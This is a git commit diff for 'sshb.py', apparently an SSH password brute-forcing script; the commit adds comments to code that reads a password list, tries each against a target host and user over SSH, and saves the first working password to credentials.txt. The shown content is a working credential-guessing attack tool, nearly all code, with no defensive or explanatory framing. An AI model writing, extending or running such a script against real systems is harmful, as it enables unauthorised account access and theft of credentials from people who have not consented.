3337f15bc8ced345c96decb8fe9598054ed13be6
jeffvader84 <gabrielsimches@me.com>
2022-02-06 16:36:55 +0000

    Update sshb.py

--- sshb.py
+++ sshb.py
@@ -23,28 +23,37 @@ def cmd_args():
 
 # script - start
 
+# check for required arguments
 if len(sys.argv) != 7:
 	print('\n[!][!] Must provide required arguments for {} to run properly\n\n[!][!] Run {} -h and review arguments list'.format(sys.argv[0], sys.argv[0]))
 	sys.exit(100)
+
+# grab arguments form command line
 args = cmd_args()
 target = args.target_host
 username = args.target_user
 passwords = args.target_password_list
+
+# pull passwords in fom list
 with open(passwords, 'r') as password_list:
 	for password in password_list:
 		password = password.strip('\n')
 		try:
+			# message showing logon attempt
 			print("[{}] Attempting password: '{}'!".format(attempts, password))
 			ssh_response = ssh(host=target, user=username, password=password, timeout=1)
+			# conditional to test if logon was successful or failed
 			if ssh_response.connected():
 				print("[!] Valid password found: '{}'!".format(password))
 				ssh_response.close()
+				# write successful logon credentials to file
 				f = open('credentials.txt', 'w')
 				f.write('Host: {}\nUser: {}\nPassword: {}'.format(target, username, password))
 				f.close()
 				sys.exit(0)
 				break
 			ssh_response.close()
+		# grab error and print custom message on failed logon attempt
 		except paramiko.ssh_exception.AuthenticationException:
 			print("[x] Invalid logon attempt!")
 		attempts += 1
